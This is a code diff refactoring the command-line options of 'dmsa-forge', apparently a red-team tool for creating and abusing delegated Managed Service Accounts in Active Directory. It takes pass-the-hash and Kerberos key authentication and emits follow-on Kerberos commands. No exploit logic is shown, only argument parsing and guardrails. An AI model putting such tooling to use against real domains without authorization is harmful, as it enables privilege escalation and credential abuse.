-    workflow.add_argument('--profile', choices=PROFILE_CHOICES, help='Apply a local preset: safe=redacted dry-run, report=JSON report, ci=quiet JSON/no banner.')
-
-    safety = parser.add_argument_group('safety and reporting')
-    safety.add_argument('--dry-run', '--plan', dest='dry_run', action='store_true', help='Validate options and print planned LDAP operations without opening LDAP.')
-    safety.add_argument('--yes', action='store_true', help='Confirm destructive actions such as delete.')
-    safety.add_argument('--json', action='store_true', help='Emit a structured JSON operation report to stdout.')
-    safety.add_argument('--output', action='store', metavar='FILE', help='Write the operation report to FILE with mode 0600. With --output-only, FILE is JSON.')
-    safety.add_argument('--output-only', '--minimal-output', dest='output_only', action='store_true', help='Ultra-quiet mode. Implies --quiet and --no-banner. Emits JSON to stdout, or JSON to --output with no stdout.')
-    safety.add_argument('--quiet', action='store_true', help='Lower terminal output to warning/error only.')
-    safety.add_argument('--no-banner', action='store_true', help='Suppress startup banner and attribution text for script-friendly output.')
-    safety.add_argument('--minimal', action='store_true', help='Lightest workflow: no broad search analysis, name resolution, or extra Kerberos command output.')
-    safety.add_argument('--lean', '--low-noise', dest='low_noise', action='store_true', help='Enable lean local defaults: --minimal, --quiet, --no-banner, and search-only --skip-dc-prereq.')
-    redaction = safety.add_mutually_exclusive_group()
-    redaction.add_argument('--redact', dest='redact', action='store_true', default=True, help='Redact sensitive local output. This is the default.')
-    redaction.add_argument('--no-redact', dest='redact', action='store_false', help='Disable local output redaction. Requires --debug.')
-
-    search = parser.add_argument_group('search')
-    search.add_argument('--summary', dest='search_summary', action='store_true', help='For search, run lightweight OU-only mode without security descriptor analysis.')
-    search.add_argument('--include-security-descriptor', '--include-sd', dest='include_sd', action='store_true', help='For search, request and analyze OU nTSecurityDescriptor security descriptors. This is the default unless --summary is used.')
-    search.add_argument('--resolve-names', action='store_true', help='For search with --include-security-descriptor, resolve matching SIDs to account names.')
-    search.add_argument('--skip-dc-prereq', action='store_true', help='For search, skip the Windows Server 2025 prerequisite DC query.')
-
-    compatibility = parser.add_argument_group('compatibility and advanced')
-    compatibility.add_argument('--allow-admin-fallback', action='store_true', help='Compatibility flag; exact target-account DN candidates are tried automatically and logged.')
-    compatibility.add_argument('--kerberos-guidance', action='store_true', help='After a verified add/verify, print external Kerberos command examples.')
-    compatibility.add_argument('--kdc-wait', '-kdc-wait', dest='kdc_wait', action='store', type=non_negative_int, default=0, metavar='SECONDS', help='After successful LDAP verification, wait before external Kerberos requests. Does not verify KDC readiness. Default: 0.')
-    compatibility.add_argument('--verify-attempts', action='store', type=non_negative_int, default=DEFAULT_VERIFY_ATTEMPTS, metavar='N', help='Post-add LDAP verification attempts. Default: %(default)s.')
-    compatibility.add_argument('--verify-delay', action='store', type=non_negative_float, default=DEFAULT_VERIFY_DELAY, metavar='SECONDS', help='Delay between post-add verification attempts. Default: %(default)s.')
-    compatibility.add_argument('--next-step-prefix', '--command-prefix', dest='next_step_prefix', action='store', metavar='COMMAND', help='Prefix generated next-step commands only, for example "proxychains -f chain1080.conf -q".')
-    compatibility.add_argument('--ts', '-ts', action='store_true', help='Adds timestamp to every logging output.')
-    compatibility.add_argument('--debug', '-debug', action='store_true', help='Turn DEBUG output ON.')
-    compatibility.add_argument('--method', '-method', type=connection_method, default='LDAP', help='Connection method. Accepts LDAP or LDAPS. Defaults to LDAP/389 for LDAP-signing-enforced environments.')
-    compatibility.add_argument('--port', '-port', type=int, choices=[389, 636], help='Destination port to connect to. LDAP defaults to 389, LDAPS to 636.')
-
-    group = parser.add_argument_group('LDAP')
-    group.add_argument('--base-dn', '--baseDN', '-baseDN', dest='base_dn', action='store', metavar='DC=test,DC=local', help='Set baseDN for LDAP. If omitted, the domain part specified in the account parameter will be used.')
-    group.add_argument('--scope-base-dn', action='store', metavar='BASE_DN', help='Guardrail: refuse target DNs outside this base DN. Defaults from account/scope domain.')
-    group.add_argument('--scope-domain', action='store', metavar='FQDN', help='Guardrail: refuse obvious domain/base DN mismatches. Defaults from account domain.')
-
-    group = parser.add_argument_group('authentication')
-    group.add_argument('--hashes', '-hashes', action='store', metavar='LMHASH:NTHASH', help='NTLM hashes, format is LMHASH:NTHASH.')
-    group.add_argument('--no-pass', '-no-pass', dest='no_pass', action='store_true', help="Don't ask for password (useful for -k).")
-    group.add_argument('--kerberos', '-k', dest='k', action='store_true', help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on account parameters.')
-    group.add_argument('--aes-key', '--aesKey', '-aesKey', dest='aes_key', action='store', metavar='hex key', help='AES key to use for Kerberos authentication (128 or 256 bits).')
-    group.add_argument('--dc-host', '-dc-host', dest='dc_host', action='store', metavar='hostname', help='Hostname of the domain controller to use. If omitted, the domain part specified in the account parameter will be used.')
-    group.add_argument('--dc-ip', '-dc-ip', dest='dc_ip', action='store', metavar='ip', help="IP of the domain controller to use. Useful if you can't translate the FQDN.")
-    return parser
-
-
-def add_common_local_options(parser, include_workflow=True, include_help_advanced=False, concise=False):
+def add_common_local_options(parser, include_workflow=True, concise=False):
     local = parser.add_argument_group('local controls')
     hidden = argparse.SUPPRESS
     local.add_argument('--profile', choices=PROFILE_CHOICES, help=hidden if concise else 'Apply a local preset: safe=redacted dry-run, report=JSON report, ci=quiet JSON/no banner.')
@@ -4460,13 +4302,11 @@ def add_common_local_options(parser, include_workflow=True, include_help_advance
     local.add_argument('--quiet', action='store_true', help=hidden if concise else 'Lower terminal output to warning/error only.')
     local.add_argument('--no-banner', action='store_true', help='Suppress startup banner and attribution text.')
     if include_workflow:
-        local.add_argument('--minimal', action='store_true', help=hidden if concise else 'Lightest workflow: no broad search analysis, name resolution, or extra Kerberos command output.')
-        local.add_argument('--lean', '--low-noise', dest='low_noise', action='store_true', help=hidden if concise else 'Enable lean local defaults.')
+        local.add_argument('--minimal', action='store_true', help=hidden if concise else 'Lightest workflow: no broad assessment analysis, name resolution, or extra Kerberos command output.')
+        local.add_argument('--lean', dest='low_noise', action='store_true', help=hidden if concise else 'Enable lean local defaults.')
     redaction = local.add_mutually_exclusive_group()
     redaction.add_argument('--redact', dest='redact', action='store_true', default=True, help=hidden if concise else 'Redact sensitive local output. This is the default.')
     redaction.add_argument('--no-redact', dest='redact', action='store_false', help=hidden if concise else 'Disable local output redaction. Requires --debug.')
-    if include_help_advanced:
-        local.add_argument('--help-advanced', action='store_true', help='Show advanced options for this command and exit.')
 
 
 def add_connection_options(parser, include_auth=True, show_auth=True, concise=False):
@@ -4494,7 +4334,7 @@ def add_common_advanced_options(parser, include_workflow=True, visible=True):
     hidden = argparse.SUPPRESS
     if include_workflow:
         advanced.add_argument('--allow-admin-fallback', action='store_true', help='Compatibility flag; exact target-account DN candidates are tried automatically and logged.' if visible else hidden)
-        advanced.add_argument('--kerberos-guidance', action='store_true', help='After a verified add/verify, print external Kerberos command examples.' if visible else hidden)
+        advanced.add_argument('--kerberos-guidance', action='store_true', help='After a verified add/verify, print external Kerberos commands.' if visible else hidden)
         advanced.add_argument('--kdc-wait', '-kdc-wait', dest='kdc_wait', action='store', type=non_negative_int, default=0, metavar='SECONDS', help='Wait after LDAP verification. Default: 0.' if visible else hidden)
         advanced.add_argument('--verify-attempts', action='store', type=non_negative_int, default=DEFAULT_VERIFY_ATTEMPTS, metavar='N', help='Post-add LDAP verification attempts.' if visible else hidden)
         advanced.add_argument('--verify-delay', action='store', type=non_negative_float, default=DEFAULT_VERIFY_DELAY, metavar='SECONDS', help='Delay between post-add verification attempts.' if visible else hidden)
@@ -4516,11 +4356,11 @@ def add_dmsa_workflow_options(parser, action):
         workflow.add_argument('--dns-hostname', '-dns-hostname', dest='dns_hostname', action='store', metavar='HOSTNAME', help='DNS hostname for the dMSA.')
     if action in DESTRUCTIVE_ACTIONS:
         workflow.add_argument('--yes', action='store_true', help='Confirm destructive action.')
-    if action == 'search':
-        search = parser.add_argument_group('search')
-        search.add_argument('--target-ou', '-target-ou', dest='target_ou', action='store', metavar='OU_DN', help='Optional OU DN used as the search base.')
+    if action in ASSESS_ACTIONS:
+        search = parser.add_argument_group('assessment')
+        search.add_argument('--target-ou', '-target-ou', dest='target_ou', action='store', metavar='OU_DN', help='Optional OU DN used as the assessment base.')
         search.add_argument('--summary', dest='search_summary', action='store_true', help='Run lightweight OU-only mode without security descriptor analysis.')
-        search.add_argument('--include-security-descriptor', '--include-sd', dest='include_sd', action='store_true', help='Request and analyze OU nTSecurityDescriptor security descriptors. This is the default unless --summary is used.')
+        search.add_argument('--include-security-descriptor', dest='include_sd', action='store_true', help='Request and analyze OU nTSecurityDescriptor security descriptors. This is the default unless --summary is used.')
         search.add_argument('--resolve-names', action='store_true', help='Resolve matching SIDs to account names. Requires --include-security-descriptor.')
         search.add_argument('--skip-dc-prereq', action='store_true', help='Skip the Windows Server 2025 prerequisite DC query.')
 
@@ -4534,7 +4374,7 @@ def build_subcommand_parser():
     parser.add_argument('--completion-script', choices=('bash', 'zsh'), help=argparse.SUPPRESS)
     subparsers = parser.add_subparsers(dest='command', metavar='action')
 
-    for action in ACTION_CHOICES:
+    for action in VISIBLE_ACTION_CHOICES:
         subparser = subparsers.add_parser(
             action,
             help=ACTION_SUMMARY[action],
@@ -4545,7 +4385,7 @@ def build_subcommand_parser():
         subparser.set_defaults(action=action, command=action, action_first=True)
         subparser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
         add_dmsa_workflow_options(subparser, action)
-        add_common_local_options(subparser, include_help_advanced=True, concise=True)
+        add_common_local_options(subparser, concise=True)
         add_connection_options(subparser, show_auth=False, concise=True)
         add_common_advanced_options(subparser, visible=False)
 
@@ -4589,19 +4429,6 @@ def build_doctor_parser():
     kerberos.add_argument('--kerberos', '-k', dest='k', action='store_true', help='Require Kerberos ccache readiness checks to pass.')
     add_common_advanced_options(doctor_parser, include_workflow=False)
     return doctor_parser
-
-
-def normalize_action_shortcut(argv):
-    if not argv or argv[0] not in ACTION_CHOICES:
-        return list(argv)
-
-    if '--action' in argv[1:] or '-action' in argv[1:]:
-        raise ValueError('Do not combine action shortcuts with --action; use either "dmsa-forge add ..." or "dmsa-forge ... --action add".')
-
-    if len(argv) == 1:
-        return ['--action', argv[0]]
-
-    return [argv[1], '--action', argv[0]] + list(argv[2:])
 
 
 def normalize_plan_shortcut(argv):
@@ -4671,7 +4498,7 @@ def prepare_cli_options(parser, options):
         options.minimal = True
         options.quiet = True
         options.no_banner = True
-        if options.action == 'search':
+        if options.action in ASSESS_ACTIONS:
             options.skip_dc_prereq = True
 
     if options.minimal:
@@ -4684,11 +4511,11 @@ def prepare_cli_options(parser, options):
             incompatible.append('--kerberos-guidance')
         if incompatible:
             parser.error('--minimal cannot be combined with %s' % ', '.join(incompatible))
-        if options.action == 'search':
+        if options.action in ASSESS_ACTIONS:
             options.skip_dc_prereq = True
         options.search_summary = True
 
-    if options.action == 'search' and not options.search_summary and not options.minimal:
+    if options.action in ASSESS_ACTIONS and not options.search_summary and not options.minimal:
         options.include_sd = True
 
     if options.scope_domain:
@@ -4697,7 +4524,7 @@ def prepare_cli_options(parser, options):
         if not validate_domain_name(options.scope_domain):
             if diagnostic_action:
                 return
-            parser.error('--scope-domain must be a DNS domain such as eighteen.htb')
+            parser.error('--scope-domain must be a DNS domain such as redteamnotes.com')
 
         scope_domain_dn = domain_to_base_dn(options.scope_domain)
         if options.scope_base_dn is None:
@@ -4732,8 +4559,8 @@ def validate_cli_options(parser, options):
     validate_action_requirements(parser, options)
     validate_reporting_options(parser, options)
 
-    if options.skip_dc_prereq and options.action != 'search':
-        parser.error('--skip-dc-prereq is only supported for search.')
+    if options.skip_dc_prereq and options.action not in ASSESS_ACTIONS:
+        parser.error('--skip-dc-prereq is only supported for assess.')
 
     if options.action in DESTRUCTIVE_ACTIONS and not options.yes and not options.dry_run:
         parser.error('Action "%s" requires --yes. Use --dry-run to preview without confirmation.' % options.action)
@@ -4760,10 +4587,10 @@ def validate_cli_options(parser, options):
         parser.error('--hashes must use LMHASH:NTHASH format')
 
     if options.dmsa_name and not validate_dmsa_name(options.dmsa_name):
-        parser.error('--dmsa-name must be a DNS-safe label, for example redpen or dMSA-REDPEN01')
+        parser.error('--dmsa-name must be a DNS-safe label: letters, digits, and hyphens only; trailing "$" is normalized automatically.')
 
     if options.dns_hostname and not validate_dns_hostname(options.dns_hostname):
-        parser.error('--dns-hostname must be a DNS hostname such as redpen.eighteen.htb')
+        parser.error('--dns-hostname must be a DNS hostname such as redpen.redteamnotes.com')
 
     for attr, flag in (
         ('base_dn', '--base-dn'),
@@ -4961,7 +4788,7 @@ def append_workflow_value_checks(checks, options):
             'DNS hostname',
             validate_dns_hostname(options.dns_hostname),
             options.dns_hostname,
-            remediation='Use a fully qualified DNS hostname such as redpen.eighteen.htb.',
+            remediation='Use a fully qualified DNS hostname such as redpen.redteamnotes.com.',
         )
 
 
@@ -5175,7 +5002,7 @@ def build_doctor_report(options):
             'scope domain',
             validate_domain_name(options.scope_domain),
             options.scope_domain,
-            remediation='Use a DNS domain such as eighteen.htb.',
+            remediation='Use a DNS domain such as redteamnotes.com.',
         )
     elif workflow_hints_present:
         doctor_check(
@@ -5493,7 +5320,7 @@ def print_shell_collision_note():
 
 def completion_script(shell):
     commands = ' '.join(ACTION_CHOICES + ('plan', 'update'))
-    common_options = '--help -h --version -v --profile --dry-run --plan --json --output --output-only --quiet --no-banner --redact --no-redact --scope-domain --scope-base-dn --dc-host --dc-ip --method --port --include-security-descriptor --include-sd --resolve-names'
+    common_options = '--help -h --version -v --profile --dry-run --plan --json --output --output-only --quiet --no-banner --redact --no-redact --scope-domain --scope-base-dn --dc-host --dc-ip --method --port --include-security-descriptor --resolve-names'
     if shell == 'bash':
         return '''# dmsa-forge bash completion
 _dmsa_forge_completion() {
@@ -5574,17 +5401,9 @@ def _main(argv=None):
         if argv[0] in REMOVED_COMMANDS:
             parser = build_subcommand_parser()
             parser.error(removed_command_message(argv[0]))
-        legacy_removed = legacy_action_value(argv)
-        if legacy_removed in REMOVED_COMMANDS:
+        if has_legacy_action_flag(argv):
             parser = build_subcommand_parser()
-            parser.error(removed_command_message(legacy_removed))
-
-    if argv[0] in ACTION_CHOICES and ('--action' in argv[1:] or '-action' in argv[1:]):
-        parser = build_subcommand_parser()
-        parser.error('Do not combine action shortcuts with --action; use either "dmsa-forge add ..." or "dmsa-forge ... --action add".')
-
-    if argv[0] in ACTION_CHOICES and '--help-advanced' in argv[1:]:
-        return print_advanced_help(argv[0])
+            parser.error(legacy_action_message())
 
     if argv[0] == 'plan':
         try:
@@ -5603,11 +5422,8 @@ def _main(argv=None):
         parser = build_subcommand_parser()
         parse_argv = list(argv)
     else:
-        parser = build_parser()
-        try:
-            parse_argv = normalize_action_shortcut(argv)
-        except ValueError as e:
-            parser.error(str(e))
+        parser = build_subcommand_parser()
+        parser.error('Unknown action "%s". Use "dmsa-forge -h" to list available actions.' % argv[0])
 
     options = parser.parse_args(parse_argv)
     apply_option_defaults(options)
